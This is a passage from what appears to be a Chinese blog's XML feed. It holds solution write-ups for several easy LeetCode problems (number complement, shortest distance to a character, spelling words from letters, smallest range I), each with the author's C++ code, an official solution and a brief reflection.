               tmp1=word[i]|<span class="number">32</span>;</span><br><span class="line">                tmp2=word[i+<span class="number">1</span>]|<span class="number">32</span>;</span><br><span class="line">                <span class="keyword">if</span>(m[tmp1]!=m[tmp2])&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//使用键盘同一行字母打印的单词</span></span><br><span class="line">            <span class="keyword">if</span>(i==n<span class="number">-1</span>)&#123;</span><br><span class="line">                result.emplace_back(word);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，虽然代码长了些，但也还行吧🙄。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>数字的补数</title>
    <url>/2020/11/27/%E6%95%B0%E5%AD%97%E7%9A%84%E8%A1%A5%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-complement/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个正整数，输出它的补数。补数是对该数的二进制表示取反。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: 2</span><br><span class="line">解释: 5 的二进制表示为 101（没有前导零位），其补数为 010。所以你需要输出 2 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 1</span><br><span class="line">输出: 0</span><br><span class="line">解释: 1 的二进制表示为 1（没有前导零位），其补数为 0。所以你需要输出 0 。</span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong></p>
<ul>
<li>给定的整数保证在 32 位带符号整数的范围内。</li>
<li>你可以假定二进制数不包含前导零位。</li>
<li>本题与 1009 <a href="https://leetcode-cn.com/problems/complement-of-base-10-integer/">https://leetcode-cn.com/problems/complement-of-base-10-integer/</a> 相同</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>对正整数二进制表示取反，取反就是和1异或运算，这样1\^1=0;0\^1=1。所以只要计算出没有前导零位时二进制表示位数全为1时的数值，例如5二进制表示为101（3位），计算出111（3位）对应的数值为7，返回5^7=2。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败23.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findComplement</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> n=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp=num;</span><br><span class="line">        <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">            n*=<span class="number">2</span>;</span><br><span class="line">            tmp/=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num^((<span class="keyword">int</span>)(n<span class="number">-1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也没有总结，就是这么任性😎。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>字符的最短距离</title>
    <url>/2020/11/28/%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E7%9F%AD%E8%B7%9D%E7%A6%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/shortest-distance-to-a-character/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个字符串 <code>S</code> 和一个字符 <code>C</code>。返回一个代表字符串 <code>S</code> 中每个字符到字符串 <code>S</code> 中的字符 <code>C</code> 的最短距离的数组。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: S &#x3D; &quot;loveleetcode&quot;, C &#x3D; &#39;e&#39;</span><br><span class="line">输出: [3, 2, 1, 0, 1, 0, 0, 1, 2, 2, 1, 0]</span><br></pre></td></tr></table></figure>
<p><strong>说明:</strong></p>
<ol>
<li>字符串 <code>S</code> 的长度范围为 <code>[1, 10000]</code>。</li>
<li><code>C</code> 是一个单字符，且保证是字符串 <code>S</code> 里的字符。</li>
<li><code>S</code> 和 <code>C</code> 中的所有字母均为小写字母。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>定义结果数组result初始化为0（默认最短距离为0），遍历字符串S，对每一个字符先判断是否是指定字符C，若是则继续遍历下个字符，从0开始判断与当前字符左右距离为dis的字符是否是C，若是则把距离存到result数组中，然后继续遍历下个字符。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.9M，击败39.62%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">shortestToChar</span><span class="params">(<span class="built_in">string</span> S, <span class="keyword">char</span> C)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=S.length();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//当前字符是C,跳出本次循环</span></span><br><span class="line">            <span class="keyword">if</span>(S[i]==C)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> dis=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                ++dis;</span><br><span class="line">                <span class="comment">//判断左右两边距离为dis时是否存在C</span></span><br><span class="line">                <span class="keyword">if</span>(i-dis&gt;=<span class="number">0</span>&amp;&amp;S[i-dis]==C || i+dis&lt;n&amp;&amp;S[i+dis]==C)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result[i]=dis;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/shortest-distance-to-a-character/solution/zi-fu-de-zui-duan-ju-chi-by-leetcode/">官方题解</a>:</h6><p><strong>方法 1：最小数组</strong><br><strong>想法</strong></p>
<p>对于每个字符 <code>S[i]</code>，试图找出距离向左或者向右下一个字符 <code>C</code> 的距离。答案就是这两个值的较小值。</p>
<p><strong>算法</strong></p>
<p>从左向右遍历，记录上一个字符 <code>C</code> 出现的位置 <code>prev</code>，那么答案就是 <code>i - prev</code>。</p>
<p>从右向左遍历，记录上一个字符 <code>C</code> 出现的位置 <code>prev</code>，那么答案就是 <code>prev - i</code>。</p>
<p>这两个值取最小就是答案</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] shortestToChar(String S, <span class="keyword">char</span> C) &#123;</span><br><span class="line">        <span class="keyword">int</span> N = S.length();</span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">        <span class="keyword">int</span> prev = Integer.MIN_VALUE / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (S.charAt(i) == C) prev = i;</span><br><span class="line">            ans[i] = i - prev;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        prev = Integer.MAX_VALUE / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = N-<span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (S.charAt(i) == C) prev = i;</span><br><span class="line">            ans[i] = Math.min(ans[i], prev - i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是 <code>S</code> 的长度，我们需要遍历字符串两次。</li>
<li>空间复杂度：$O(N)$，<code>ans</code> 数组的大小</li>
</ul>
<p>​         </p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解比较巧妙，线性时间复杂度，效率比较高。虽然我也想到计算左右两边距离取最小，但是我想到的还是要遍历对每个字符遍历左右两边所有字符直到找到指定字符C，官方题解就巧妙的利用一次遍历线性复杂度就解决了，牛逼🐂</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>拼写单词</title>
    <url>/2020/11/28/%E6%8B%BC%E5%86%99%E5%8D%95%E8%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一份『词汇表』（字符串数组） <code>words</code> 和一张『字母表』（字符串） <code>chars</code>。</p>
<p>假如你可以用 <code>chars</code> 中的『字母』（字符）拼写出 <code>words</code> 中的某个『单词』（字符串），那么我们就认为你掌握了这个单词。</p>
<p>注意：每次拼写（指拼写词汇表中的一个单词）时，<code>chars</code> 中的每个字母都只能用一次。</p>
<p>返回词汇表 <code>words</code> 中你掌握的所有单词的 长度之和。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：words &#x3D; [&quot;cat&quot;,&quot;bt&quot;,&quot;hat&quot;,&quot;tree&quot;], chars &#x3D; &quot;atach&quot;</span><br><span class="line">输出：6</span><br><span class="line">解释： </span><br><span class="line">可以形成字符串 &quot;cat&quot; 和 &quot;hat&quot;，所以答案是 3 + 3 &#x3D; 6。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：words &#x3D; [&quot;hello&quot;,&quot;world&quot;,&quot;leetcode&quot;], chars &#x3D; &quot;welldonehoneyr&quot;</span><br><span class="line">输出：10</span><br><span class="line">解释：</span><br><span class="line">可以形成字符串 &quot;hello&quot; 和 &quot;world&quot;，所以答案是 5 + 5 &#x3D; 10。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>`1 &lt;= words.length &lt;= 1000</li>
<li><code>1 &lt;= words[i].length, chars.length &lt;= 100</code></li>
<li>所有字符串中都仅包含小写英文字母</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>定义一个大小为26的数组存储字母表chars字符串中各个字母的个数，遍历字符串数组words对每一个单词字符串先判断长度，如果大于chars长度可定不满足则进行下个字符串的遍历，否则遍历单词字符串，判断字母是否在字母表中存在，若存在则继续若不存在则不满足跳出循环并标记该单词为false，若单词标记为true则把长度累加到结果中。</p>
<p><strong>c++代码：</strong>(执行用时68ms，击败97.50%，内存消耗16.5M，击败76.81%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countCharacters</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; words, <span class="built_in">string</span> chars)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//计数法</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> len_word=<span class="number">0</span>,len_chars=chars.length();</span><br><span class="line">        <span class="keyword">int</span> ch[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> tmp[<span class="number">26</span>];</span><br><span class="line">        <span class="comment">//存储chars中每个字母的个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c1:chars)&#123;</span><br><span class="line">            ++ch[c1<span class="number">-97</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">string</span> word:words)&#123;</span><br><span class="line">            <span class="keyword">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">            <span class="comment">//每次字母表chars都应该被恢复原值</span></span><br><span class="line">            copy(begin(ch),end(ch),begin(tmp));</span><br><span class="line">            len_word=word.size();</span><br><span class="line">            <span class="comment">//若word长度大于chars长度，肯定不满足条件</span></span><br><span class="line">            <span class="keyword">if</span>(len_word&gt;len_chars)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">char</span> c2:word)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(tmp[c2<span class="number">-97</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">                        flag=<span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        --tmp[c2<span class="number">-97</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                result+=word.length();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-words-that-can-be-formed-by-characters/solution/pin-xie-dan-ci-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：哈希表记数</strong></p>
<p><strong>思路和算法</strong></p>
<p>显然，对于一个单词 <code>word</code>，只要其中的每个字母的数量都不大于 <code>chars</code> 中对应的字母的数量，那么就可以用 <code>chars</code> 中的字母拼写出 <code>word</code>。所以我们只需要用一个哈希表存储 <code>chars</code> 中每个字母的数量，再用一个哈希表存储 <code>word</code> 中每个字母的数量，最后将这两个哈希表的键值对逐一进行比较即可。</p>
<p><strong>c++代码：</strong>(执行用时424ms，击败34.93%，内存消耗49.9M，击败30.08%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countCharacters</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; words, <span class="built_in">string</span> chars)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; chars_cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : chars)</span><br><span class="line">            ++chars_cnt[c];</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">string</span> word : words) &#123;</span><br><span class="line">            <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; word_cnt;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> c : word)</span><br><span class="line">                ++word_cnt[c];</span><br><span class="line">            <span class="keyword">bool</span> is_ans = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> c : word)</span><br><span class="line">                <span class="keyword">if</span> (chars_cnt[c] &lt; word_cnt[c]) &#123;</span><br><span class="line">                    is_ans = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_ans)</span><br><span class="line">                ans += word.size();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 为所有字符串的长度和。我们需要遍历每个字符串，包括 <code>chars</code> 以及数组 <code>words</code> 中的每个单词。</p>
</li>
<li><p>空间复杂度：$O(S)$，其中 $S$ 为字符集大小，在本题中 $S$ 的值为 $26$（所有字符串仅包含小写字母）。程序运行过程中，最多同时存在两个哈希表，使用的空间均不超过字符集大小 $S$，因此空间复杂度为 $O(S)$。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>总的来说官方题解和我的思路还算一致，不过我的更像是直观上的解法，官方题解是经过总结认真思考后的题解简洁明了，题目也比较简单，没想到我提交的代码效率还挺高的，有点意外😏。另外官方题解有视频题解，可以了解一下。官方题解效率反而不是很高，应该要先判断一下单词长度与字母表长度，若是长度不符就应该直接跳过进行下一个单词，而官方题解还是要进行单词字母计数与字母表中的计数进行比较，还有就是官方题解要遍历每一个单词中的所有字符，我的方法是只要遇到不满足条件的字符就终止了，所以比官方题解效率要高一些。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最小差值I</title>
    <url>/2020/11/28/%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BCI/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/smallest-range-i/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 A，请你给数组中的每个元素 A[i] 都加上一个任意数字 x （-K &lt;= x &lt;= K），从而得到一个新数组 B 。</p>
<p>返回数组 B 的最大值和最小值之间可能存在的最小差值。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1], K &#x3D; 0</span><br><span class="line">输出：0</span><br><span class="line">解释：B &#x3D; [1]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [0,10], K &#x3D; 2</span><br><span class="line">输出：6</span><br><span class="line">解释：B &#x3D; [2,8]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1,3,6], K &#x3D; 3</span><br><span class="line">输出：0</span><br><span class="line">解释：B &#x3D; [3,3,3] 或 B &#x3D; [4,4,4]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt;= 10000</code></li>
<li><code>0 &lt;= K &lt;= 10000</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>分析题目，可以得出数组B的最大值maxB最小值minB一定是可以由数组A中的最大值maxA和最小值minA变化而来，所以只需要求出maxA+x，minA+x（-K&lt;=x&lt;=K）两者之间可能存在的最小差值，两者之间差值的取值范围是[maxA-minA-2K,maxA-minA+2K],注意如果maxA-minA-2K&lt;0的话差值要取0，因为差值是最大值减去最小值必然是非负数且二者之差在2K之内存在两个数使得二者变化后差为0。</p>
<p><strong>c++代码：</strong>(执行用时40ms，击败48.28%，内存消耗14.9M，击败10.64%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">smallestRangeI</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxA=*max_element(A.begin(),A.end());</span><br><span class="line">        <span class="keyword">int</span> minA=*min_element(A.begin(),A.end());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*K&gt;(maxA-minA)?<span class="number">0</span>:<span class="built_in">abs</span>(maxA-minA<span class="number">-2</span>*K);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/smallest-range-i/solution/zui-xiao-chai-zhi-i-by-leetcode/">官方题解</a>:</h6><p><strong>方法 1：数学</strong></p>
<p><strong>想法和算法</strong></p>
<p>假设 <code>A</code> 是原始数组，<code>B</code> 是修改后的数组，我们需要最小化 <code>max(B) - min(B)</code>，也就是分别最小化 <code>max(B)</code> 和最大化 <code>min(B)</code>。</p>
<p><code>max(B)</code> 最小可能为 <code>max(A) - K</code>，因为 <code>max(A)</code> 不可能再变得更小。同样，<code>min(B)</code> 最大可能为 <code>min(A) + K</code>。所以结果 <code>max(B) - min(B)</code> 至少为 <code>ans = (max(A) - K) - (min(A) + K)</code>。</p>
<p>我们可以用一下修改方式获得结果（如果 <code>ans &gt;= 0</code>）：</p>
<ul>
<li>如果 $A[i] \leq \min(A) + K$，那么 $B[i] = \min(A) + K$</li>
<li>如果 $A[i] \geq \max(A) - K$，那么 $B[i] = \max(A) - K$</li>
<li>否则 $B[i] = A[i]$。</li>
</ul>
<p>如果 <code>ans &lt; 0</code>，最终结果会有 <code>ans = 0</code>，同样利用上面的修改方式。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">smallestRangeI</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> min = A[<span class="number">0</span>], max = A[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x: A) &#123;</span><br><span class="line">            min = Math.min(min, x);</span><br><span class="line">            max = Math.max(max, x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(<span class="number">0</span>, max - min - <span class="number">2</span>*K);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是<code>A</code> 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路叙述不同，但是代码实现方式还是一样的，我是使用了封装好的库\<algorithm>求数组中的最大值和最小值，官方题解是遍历了数组A求出最大值max和最小值min，区别不大。</algorithm></p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>Pain past is pleasure!</title>
